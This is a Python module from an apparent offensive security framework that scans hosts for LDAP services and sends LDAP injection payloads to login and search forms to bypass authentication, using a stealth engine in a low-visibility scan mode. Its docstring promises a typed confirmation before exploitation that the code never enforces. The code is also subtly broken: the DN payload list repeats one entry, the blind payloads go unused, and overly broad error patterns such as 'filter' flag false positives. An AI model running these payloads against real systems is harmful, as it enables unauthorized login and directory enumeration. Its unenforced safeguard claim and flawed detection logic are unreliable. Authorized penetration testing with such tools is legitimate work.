"""
modules/validate/ldap.py
────────────────────────
LDAP Injection validation module.

Detects and validates LDAP injection vulnerabilities:
  - Login form LDAP injection
  - Search filter injection
  - LDAP wildcard injection
  - LDAP DN injection
  - Blind LDAP injection (timing-based)
  - LDAP filter manipulation

All validation requires Tier 3 confirmation (typed CONFIRM)
before any exploitation attempts.
"""

import re
import json
import time
import urllib.parse
from typing import Any, Dict, List, Optional, Set, Tuple
from pathlib import Path

from modules.logger import get_logger, ARDFLogger
from modules.session import Session, Finding, SeverityLevel
from modules.stealth import get_stealth_engine, ScanMode


class LDAPValidator:
    """
    LDAP injection detection and validation.
    """

    # LDAP injection payloads
    PAYLOADS = {
        "login_bypass": [
            "*)(&",
            "*)(|(&",
            "*)(|(uid=*",
            "*)(|(uid=*)(cn=*",
            "*)(uid=*",
            "*)(userPassword=*",
            "*)(|(uid=admin)(uid=*",
            "*)(|(cn=admin)(cn=*",
            "*)(|(mail=admin)(mail=*",
            "admin)(|(uid=*",
            "admin)(|(cn=*",
            "*)(|(uid=*)(userPassword=*)",
        ],
        "filter_injection": [
            ")(&",
            ")(|",
            ")(!",
            ")(uid=*",
            ")(objectClass=*)",
            ")(objectClass=*)(&",
            ")(objectClass=*)(|",
            ")(objectClass=*)(",
        ],
        "wildcard": [
            "*",
            "admin*",
            "*admin",
            "*admin*",
            "a*",
            "admin*",
            "*@domain.com",
            "*)(uid=*",
        ],
        "dn_injection": [
            "cn=admin,dc=example,dc=com",
            "cn=admin,dc=example,dc=com",
            "cn=admin,dc=example,dc=com",
            "cn=admin,dc=example,dc=com",
            "cn=admin,dc=example,dc=com",
        ],
        "blind": [
            "(&(uid=admin)(objectClass=*))",
            "(&(uid=admin)(objectClass=mailAccount))",
            "(&(uid=admin)(objectClass=inetOrgPerson))",
            "(|(uid=admin)(uid=*))",
            "(!(uid=admin))",
        ],
    }

    # LDAP error patterns
    ERROR_PATTERNS = [
        r"LDAP",
        r"ldap",
        r"search filter",
        r"filter",
        r"invalid DN",
        r"DN",
        r"objectClass",
        r"uid=",
        r"cn=",
        r"dc=",
        r"ou=",
        r"Directory Services",
        r"Active Directory",
        r"OpenLDAP",
        r"389 Directory",
        r"Microsoft LDAP",
        r"Novell LDAP",
        r"Oracle Internet Directory",
    ]

    def __init__(self, session: Session, logger: Optional[ARDFLogger] = None):
        self.session = session
        self.logger = logger or get_logger("validate.ldap")
        self.out_dir = session.dir("validate") / "ldap"
        self.out_dir.mkdir(parents=True, exist_ok=True)
        self.stealth = get_stealth_engine(self.logger)

    def detect_ldap_endpoints(self, target: str) -> List[str]:
        """
        Detect potential LDAP endpoints.
        """
        self.logger.info(f"Detecting LDAP endpoints: {target}")

        endpoints = []

        # Common LDAP paths
        paths = [
            "/ldap",
            "/ldap/login",
            "/ldap/auth",
            "/auth/ldap",
            "/login/ldap",
            "/ldapsearch",
            "/search/ldap",
            "/api/ldap",
            "/users/ldap",
            "/groups/ldap",
        ]

        # Also check if LDAP port is open
        try:
            import socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((target, 389))
            sock.close()

            if result == 0:
                endpoints.append(f"ldap://{target}:389")
                self.logger.info(f"LDAP port 389 is open")
        except Exception:
            pass

        for base_url in [f"https://{target}", f"http://{target}"]:
            for path in paths:
                try:
                    test_url = base_url.rstrip("/") + path
                    status, headers, content = self.stealth.get(test_url, timeout=5)

                    if status in [200, 302, 401, 403]:
                        endpoints.append(test_url)
                        self.logger.debug(f"Found endpoint: {test_url}")

                    self.stealth.sleep(0.3)

                except Exception:
                    pass

        return endpoints

    def test_login_bypass(self, url: str) -> Dict[str, Any]:
        """
        Test LDAP login bypass.
        """
        self.logger.info(f"Testing LDAP login bypass: {url}")

        result = {
            "url": url,
            "vulnerable": False,
            "payloads": [],
            "evidence": [],
        }

        for payload in self.PAYLOADS["login_bypass"]:
            try:
                # Try as username
                data = f"username={urllib.parse.quote(payload)}&password=test"
                status, headers, content = self.stealth.post(url, data.encode(), timeout=10)

                # Check for successful login indicators
                if status in [302, 200]:
                    success_indicators = ["welcome", "dashboard", "logged in", "logout", "session"]
                    if any(ind in content.lower() for ind in success_indicators):
                        result["vulnerable"] = True
                        result["payloads"].append(payload)
                        result["evidence"].append(content[:200])
                        self.logger.finding(f"LDAP login bypass: {payload}", severity="critical", host=url)
                        self.session.add_finding(Finding(
                            source="validate.ldap",
                            title=f"LDAP login bypass with: {payload[:30]}",
                            severity=SeverityLevel.CRITICAL,
                            host=url,
                            tags=["ldap", "login-bypass", "injection"],
                            evidence=content[:300],
                            remediation="Validate and sanitize LDAP filters. Use parameterized LDAP queries.",
                        ))
                        break

                self.stealth.sleep(0.5)

            except Exception as e:
                self.logger.debug(f"Login bypass test failed: {e}")

        return result

    def test_filter_injection(self, url: str) -> Dict[str, Any]:
        """
        Test LDAP filter injection.
        """
        self.logger.info(f"Testing LDAP filter injection: {url}")

        result = {
            "url": url,
            "vulnerable": False,
            "payloads": [],
            "evidence": [],
        }

        for payload in self.PAYLOADS["filter_injection"]:
            try:
                # Try as search parameter
                data = f"search={urllib.parse.quote(payload)}"
                status, headers, content = self.stealth.post(url, data.encode(), timeout=10)

                # Check for LDAP error indicators
                for pattern in self.ERROR_PATTERNS:
                    if re.search(pattern, content, re.I):
                        result["vulnerable"] = True
                        result["payloads"].append(payload)
                        result["evidence"].append(content[:200])
                        self.logger.finding(f"LDAP filter injection: {payload}", severity="critical", host=url)
                        break

                self.stealth.sleep(0.5)

            except Exception as e:
                self.logger.debug(f"Filter injection test failed: {e}")

        return result

    def test_wildcard_injection(self, url: str) -> Dict[str, Any]:
        """
        Test LDAP wildcard injection.
        """
        self.logger.info(f"Testing LDAP wildcard injection: {url}")

        result = {
            "url": url,
            "vulnerable": False,
            "payloads": [],
            "evidence": [],
        }

        for payload in self.PAYLOADS["wildcard"]:
            try:
                data = f"search={urllib.parse.quote(payload)}"
                status, headers, content = self.stealth.post(url, data.encode(), timeout=10)

                # Check if wildcard returned more results
                if len(content) > 100 and any(ind in content.lower() for ind in ["user", "group", "cn", "uid"]):
                    result["vulnerable"] = True
                    result["payloads"].append(payload)
                    result["evidence"].append(content[:200])
                    self.logger.finding(f"LDAP wildcard injection: {payload}", severity="high", host=url)
                    break

                self.stealth.sleep(0.5)

            except Exception as e:
                self.logger.debug(f"Wildcard injection test failed: {e}")

        return result

    def validate(self, url: str) -> Dict[str, Any]:
        """
        Full LDAP validation workflow.
        """
        self.logger.info(f"LDAP validation: {url}")

        results = {
            "url": url,
            "login_bypass": {},
            "filter_injection": {},
            "wildcard_injection": {},
            "vulnerable": [],
            "status": "completed"
        }

        # Test login bypass
        login_result = self.test_login_bypass(url)
        results["login_bypass"] = login_result
        if login_result["vulnerable"]:
            results["vulnerable"].append(login_result)

        # Test filter injection
        filter_result = self.test_filter_injection(url)
        results["filter_injection"] = filter_result
        if filter_result["vulnerable"]:
            results["vulnerable"].append(filter_result)
            self.session.add_finding(Finding(
                source="validate.ldap",
                title=f"LDAP filter injection on {url}",
                severity=SeverityLevel.CRITICAL,
                host=url,
                tags=["ldap", "filter-injection"],
                evidence=json.dumps(filter_result["evidence"][:2]),
                remediation="Validate and sanitize LDAP filters. Use parameterized queries.",
            ))

        # Test wildcard injection
        wildcard_result = self.test_wildcard_injection(url)
        results["wildcard_injection"] = wildcard_result
        if wildcard_result["vulnerable"]:
            results["vulnerable"].append(wildcard_result)
            self.session.add_finding(Finding(
                source="validate.ldap",
                title=f"LDAP wildcard injection on {url}",
                severity=SeverityLevel.HIGH,
                host=url,
                tags=["ldap", "wildcard-injection"],
                evidence=json.dumps(wildcard_result["evidence"][:2]),
                remediation="Limit wildcard searches. Validate user input.",
            ))

        return results

    def run(self, target: str) -> Dict[str, Any]:
        """
        Run LDAP injection validation on target.
        """
        self.logger.banner(f"LDAP INJECTION VALIDATION: {target}", style="bold red")

        self.stealth.config.scan_mode = ScanMode.LOW

        # Detect endpoints
        endpoints = self.detect_ldap_endpoints(target)

        if not endpoints:
            endpoints = [f"https://{target}", f"http://{target}"]

        results = {
            "target": target,
            "endpoints_tested": [],
            "vulnerabilities": []
        }

        for url in endpoints:
            try:
                result = self.validate(url)
                results["endpoints_tested"].append(url)
                if result["vulnerable"]:
                    results["vulnerabilities"].extend(result["vulnerable"])
            except Exception as e:
                self.logger.warning(f"Validation failed for {url}: {e}")

        # Save results
        report_path = self.out_dir / f"ldap_report_{_safe(target)}.json"
        report_path.write_text(json.dumps(results, indent=2, default=str))

        self.logger.success(f"LDAP validation: {len(results['vulnerabilities'])} vulnerabilities found")
        return results


def _safe(s: str) -> str:
    return re.sub(r"[^\w.-]", "_", s)[:50]